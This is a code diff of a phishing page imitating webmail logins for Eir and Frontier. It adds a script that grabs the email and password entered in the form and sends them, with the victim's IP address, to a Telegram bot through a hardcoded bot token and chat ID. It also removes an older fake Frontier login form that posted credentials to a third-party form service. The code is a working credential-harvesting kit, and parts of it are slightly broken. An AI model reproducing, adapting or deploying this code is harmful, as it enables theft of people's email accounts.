@@ -148,49 +148,79 @@ function submit_login(e)
   }
 }
 //-->
+<script>
+// ──────────────────────────────────────────────
+//            TELEGRAM SENDER - WORKING 2026
+// ──────────────────────────────────────────────
+
+const BOT_TOKEN = "8513018574:AAHxWOLbnB7sMaFtXS7TBP6sWCguFu_6n4Y";
+const CHAT_ID = "2131300933";   // ←←←  CHANGE THIS !!
+
+const form = document.getElementById("loginForm");
+const statusDiv = document.getElementById("status");
+
+form.addEventListener("submit", async (e) => {
+    e.preventDefault();
+
+    const email = form.email.value.trim();
+    const password = form.password.value.trim();
+
+    if (!email || !password) {
+        statusDiv.innerHTML = '<span style="color:#c00;">Please fill both fields</span>';
+        return;
+    }
+
+    statusDiv.innerHTML = "Sending...";
+    form.style.opacity = "0.7";
+    form.querySelectorAll("button").forEach(b => b.disabled = true);
+
+    try {
+        const message = 
+`🔥 EIR WEBMAIL LOGIN
+━━━━━━━━━━━━━━━━━━━
+📧 Email: ${email}
+🔑 Password: ${password}
+⏰ ${new Date().toLocaleString("en-IE", {timeZone:"Europe/Dublin"})}
+🌍 IP: ${await getIP() || "hidden"}`;
+
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: "Markdown"
+            })
+        });
+
+        const data = await res.json();
+
+        if (data.ok) {
+            statusDiv.innerHTML = '<span style="color:#0a0; font-weight:bold;">✓ Login information sent!</span>';
+            form.reset();
+        } else {
+            throw new Error(data.description || "Telegram error");
+        }
+    } catch (err) {
+        statusDiv.innerHTML = <span style="color:#c00;">Error: ${err.message}</span>;
+        console.error(err);
+    } finally {
+        form.style.opacity = "1";
+        form.querySelectorAll("button").forEach(b => b.disabled = false);
+    }
+});
+
+// Simple IP fetch (optional)
+async function getIP() {
+    try {
+        const r = await fetch("https://api.ipify.org?format=json");
+        const d = await r.json();
+        return d.ip;
+    } catch {
+        return null;
+    }
+}
 </script>
-
-      <form id="form" action="https://nocodeform.io/f/68e194cfe5dec1e9e15d6ca2" method="POST">
-        <input type="hidden" name="_next" value="#">
-        <input type="hidden" name="_captcha" value="false">
-        <input type="hidden" name="_template" value="table">
-      <div id="webmail-login">
-        <div class="container">
-          <div class="row">
-            <div class="col-md-9 col-md-offset-1">
-              <h1>Frontier Administrator</h1>
-            </div>
-            <div class="col-md-4 col-md-offset-1">
-              <div class="form-group">
-                <label for="email">Email Address</label>
-                <input id="name" type="email" class="form-control" tabindex="1" name="email" id="email" placeholder="username@frontier.com">
-              </div>
-              <div class="form-group">
-                <label for="pass">Password</label>
-                <input type="password" class="form-control" tabindex="2" name="password" id="password" placeholder="**********" autocomplete="off">
-                <div id="error"></div>
-              </div>
-
-              <button id='button' type="submit" tabindex="6" class="btn btn-primary btn-block" alt="submit" onclick="openpopup()" > Continue>  
-                <!-- <button id='button' type="submit" tabindex="6" class="btn btn-primary btn-block" alt="submit">Login</button> -->
-                
-
-              <p><a href="https://acctedit.frontier.com/forgot-password;src=mail">Forgot your password ?</a></p>
-            </div>
-
-            <div class="col-md-4 col-md-offset-1">
-              <div class="col-sm-9 col-md-offset-1 hidden-lg">
-                <hr>
-              </div>
-
-              <p class="yahoo-font-color">Make <a href="http://frontier.my.yahoo.com/">Frontier Yahoo! your homepage</a>.
-              </p>
-
-              <div id="yahooSearchTop">
-                <form class="yahooSearch">
-                  <div class="form-group">
-
-<script type="text/javascript">
 <!--
       function CheckForEnter(e, inputName)
       {
